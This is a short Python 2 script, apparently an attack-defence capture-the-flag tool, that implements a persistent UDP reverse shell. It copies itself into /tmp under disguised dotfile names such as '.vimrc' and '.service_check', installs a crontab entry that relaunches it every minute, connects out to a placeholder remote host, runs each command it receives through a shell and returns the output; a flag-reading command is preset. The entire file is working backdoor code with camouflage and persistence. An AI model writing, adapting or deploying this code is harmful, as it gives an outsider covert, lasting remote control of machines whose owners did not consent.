#!/usr/bin/python
import socket, subprocess
import time, errno
import os, random
import thread

HOST = 'remote_ip'
PORT = remote_port
SLEEP_TIME = sleep_interval
CMD = 'cat /home/flags/magic'

def Threadfun1(string, sleeptime, *args):
    while 1:
        name = random.choice (['.service_check', '.init', '.gitinit', '.vimrc', '.vmware'])
        os.system('cp %s/%s /tmp/%s' %(os.getcwd(), __file__, name))
        os.system('echo "*/1 * * * * python /tmp/%s" | crontab -' %name)
        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
        thread.start_new_thread(Threadfun1, ("ThreadFun1", 1)) 
        while 1:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((HOST, PORT))
            try:
                s.send('[*] Connection from %s \n' % s.getsockname()[0])
                while 1:
                     data = s.recv(1024)
                     if 'quit' in data:
                        s.send('[*] Close connection and sleep %d sec \n' %SLEEP_TIME)
                        break
                     proc = subprocess.Popen(data, shell=True, 
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     stdout_value = proc.stdout.read() + proc.stderr.read()
                     s.send(stdout_value)
                s.close()
                time.sleep(SLEEP_TIME)
            except socket.error, e:
                s.close()
                time.sleep(SLEEP_TIME)        
